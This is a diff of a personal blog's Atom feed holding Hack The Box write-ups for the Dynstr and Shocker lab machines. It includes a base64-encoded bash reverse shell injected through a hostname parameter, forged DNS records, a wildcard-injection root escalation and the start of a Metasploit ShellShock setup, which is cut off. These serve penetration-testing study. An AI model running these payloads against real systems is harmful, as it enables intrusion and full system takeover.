@@ -1,4 +1,733 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-05-23T16:15:35+02:00</updated><id>/feed.xml</id><title type="html">The Cyber Experiment</title><subtitle>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</subtitle><entry><title type="html">Laboratory Write-Up</title><link href="/htb/laboratory" rel="alternate" type="text/html" title="Laboratory Write-Up" /><published>2021-04-16T23:44:00+02:00</published><updated>2021-04-16T23:44:00+02:00</updated><id>/htb/laboratory</id><content type="html" xml:base="/htb/laboratory">&lt;p&gt;This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-10-17T21:19:40+02:00</updated><id>/feed.xml</id><title type="html">The Cyber Experiment</title><subtitle>This website serves as learning tool. This website contains blog like posts that describe the usage of various tools and writeups for CTFs and any other topic that I played with.</subtitle><entry><title type="html">Dynstr Write-Up</title><link href="/htb/dynstr" rel="alternate" type="text/html" title="Dynstr Write-Up" /><published>2021-10-17T15:00:00+02:00</published><updated>2021-10-17T15:00:00+02:00</updated><id>/htb/dynstr</id><content type="html" xml:base="/htb/dynstr">&lt;h1 id=&quot;dynstr&quot;&gt;Dynstr&lt;/h1&gt;
+&lt;p&gt;Dynstr is a medium difficulty machine on Hack The Box. To gain a foothold, we must leverage a command execution vulnerability. Next, we escalate to the bindmgr user by inserting a DNS record and using a found RSA-key. We escalate to the root user by exploiting a script with wildcard injection, that we can run as sudo without password.&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning-and-enumeration&quot;&gt;Scanning and Enumeration&lt;/h2&gt;
+&lt;p&gt;I start the enumeration with a basic nmap scan and discover that ports 22, 53 and 80 are open&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Tue Sep 28 18:10:15 2021 as: nmap -sV -sC -n -oA nmap/dynstr -p- 10.10.10.244&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.244
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.024s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65532 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+53/tcp open  domain  ISC BIND 9.16.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Dyna DNS
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Tue Sep 28 18:10:45 2021 -- 1 IP address (1 host up) scanned in 29.70 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;enumerating-port-80-http&quot;&gt;Enumerating Port 80 (HTTP)&lt;/h2&gt;
+&lt;p&gt;The web application hosts a dynamic DNS service. They are still in beta and recommend using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynadns:sndanyd&lt;/code&gt; credentials for their API. Their API is based on that of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;noip.com&lt;/code&gt; and they allow creation of subdomains for 3 zones:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no-ip.htb&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dnsalias.htb&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dynamicdns.htb&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Using the following request we can create a subdomain:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl http://dynadns:sndanyd@10.10.10.244/nic/update?hostname=attacker.no-ip.htb&amp;amp;myip=10.10.14.1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Upon closer look of the query parameters we discover that the hostname parameter is vulnerable to command injection. The period is a bad character and causes the payload to fail, therefore I encode a basic bash reverse shell using base64.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.1/80 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;  | &lt;span class=&quot;nb&quot;&gt;base64
+&lt;/span&gt;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xLzgwIDA+JjE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The next HTTP request will deliver and run the payload:&lt;/p&gt;
+&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/nic/update?hostname=attacker|echo+`echo+'YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xLzgwIDA%2BJjE%3D'|base64+-d|bash`.dynamicdns.htb&amp;amp;myip=10.10.14.1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dynupdate.no-ip.htb&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Authorization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Basic ZHluYWRuczpzbmRhbnlk&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;curl/7.74.0&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;*/*&lt;/span&gt;
+&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;privesc-to-bindmgr&quot;&gt;PrivEsc to Bindmgr&lt;/h2&gt;
+&lt;p&gt;After sending a payload we get a shell as the www-data user. We quickly find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bindmgr&lt;/code&gt; user which has some troubleshooting files in its home directory. In the strace output we find an RSA private key, however this does not seem to work on via SSH. After inspecting the authorized_keys file, we discover that the key is restricted by DNS origin.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@dynstr:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/bindmgr/.ssh/authorized_keys  
+&lt;span class=&quot;nv&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*.infra.dyna.htb&quot;&lt;/span&gt; ssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We know the server is running a DNS server, so lets see if we can create a DNS record for ourself. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/&lt;/code&gt; directory we find keys for creating DNS records. Lets use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsupdate&lt;/code&gt; tool to create a record for ourself:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nsupdate &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; /etc/bind/infra.key
+
+server 127.0.0.1
+
+update delete sftp.infra.dyna.htb
+
+add sftp.infra.dyna.htb 30 IN A 10.10.14.1
+
+update delete 1.14.10.10.in-addr.arpa PTR
+update add 1.14.10.10.in-addr.arpa 30 PTR sftp.infra.dyna.htb
+send
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we can SSH into the machine as the bindmgr user using the recovered RSA key.&lt;/p&gt;
+
+&lt;h2 id=&quot;privesc-to-root&quot;&gt;PrivEsc to Root&lt;/h2&gt;
+&lt;p&gt;The bindmgr may run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/bindmgr.sh&lt;/code&gt; script as root without a password:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;: unable to resolve host dynstr.dyna.htb: Name or service not known Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bindmgr on dynstr:     env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin  User bindmgr may run the following commands on dynstr:     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/bin/bindmgr.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The script contains the following line that is vulnerable to wildcard injection:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cp .version * /etc/bind/named.bindmgr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; wildcard will be expanded to all files in the directory. In addition the root user will become the new owner of the copied file. To escalate our privileges we can create a SUID bash program and then set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--perserve=mode&lt;/code&gt; flag on the copy command so that the SUID permission will be preserved.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp 
+&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;workdir &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;workdir 
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'5'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;.version 
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/bin/bash &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 
+&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+s bash 
+&lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--preserve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mode 
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/local/bindmgr.sh 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can now get a root shell be running: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/named.bindmgr/bash -p&lt;/code&gt;&lt;/p&gt;</content><author><name></name></author><category term="htb" /><summary type="html">Dynstr Dynstr is a medium difficulty machine on Hack The Box. To gain a foothold, we must leverage a command execution vulnerability. Next, we escalate to the bindmgr user by inserting a DNS record and using a found RSA-key. We escalate to the root user by exploiting a script with wildcard injection, that we can run as sudo without password.</summary></entry><entry><title type="html">Shocker Write-Up</title><link href="/htb/shocker" rel="alternate" type="text/html" title="Shocker Write-Up" /><published>2021-08-21T15:00:00+02:00</published><updated>2021-08-21T15:00:00+02:00</updated><id>/htb/shocker</id><content type="html" xml:base="/htb/shocker">&lt;h1 id=&quot;shocker&quot;&gt;Shocker&lt;/h1&gt;
+&lt;p&gt;The Shocker box was part of the easy month on HTB. We gain initial foothold as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shelly&lt;/code&gt; user by exploiting the ShellShock vulnerability. We escalate to the root user by exploiting a sudoers misconfiguration that allows us to run perl as root wihtout a password.&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning-and-enumeration&quot;&gt;Scanning and Enumeration&lt;/h2&gt;
+&lt;p&gt;I start the enumeration with a basic nmap scan and discover that port 80 (HTTP) is open.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Thu Jul  8 12:50:02 2021 as: nmap -sC -sV -n -oA htb/shocker/nmap/initial 10.10.10.56&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.56
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.025s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Site doesnt have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Thu Jul  8 12:50:11 2021 -- 1 IP address (1 host up) scanned in 9.07 seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;enumerating-port-80-http&quot;&gt;Enumerating Port 80 (HTTP)&lt;/h2&gt;
+&lt;p&gt;The webapplication exposes no interesting functionality. Further enumerating the web app through forced browsing using GoBuster; I discover the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/cgi-bin/&lt;/code&gt; directory. Given that the machine is called shocker it might be worthwhile to check for the well known ShellShock vulnerability. ShellShock is a parser vulnerability in Bash that allows for arbitrary command execution.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://10.10.10.56/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/common.txt 
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.10.56/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/07/09 05:27:43 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/.hta                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 290]
+/.htaccess            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 295]
+/.htpasswd            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 295]
+/cgi-bin/             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 294]  &amp;lt;&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt; Lets find any CGI Scripts here
+/index.html           &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 137]
+/server-status        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 299]
+                                               
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/07/09 05:27:55 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To test for ShellShock we must force the server to call bash. Using gobuster I look for Bash shell scripts that can be invoked.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://10.10.10.56/cgi-bin/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; cgi,sh 
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Url:                     http://10.10.10.56/cgi-bin/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Method:                  GET
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:                 10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Negative Status codes:   404
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] User Agent:              gobuster/3.1.0
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Extensions:              cgi,sh
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:                 10s
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/07/09 07:06:58 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;directory enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+/.html.cgi            &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 303]
+/.html.sh             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 302]
+/.html                &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 299]
+/.htm                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 298]
+/.htm.cgi             &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 302]
+/user.sh              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 118]     &amp;lt;&lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt; Looks like a bash script
+/.htm.sh              &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Status: 403&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Size: 301]
+...[snip]...                                               
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2021/07/08 13:36:26 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+
+Having identified the &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;user.sh&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; bash script we can now &lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the ShellShock vulnerability. I will use Metasploit that has a module &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;exploiting ShellShock. After invoking the module I get a shell as the &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;shelly&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; user.
+
+&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;bash
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST 10.10.14.167
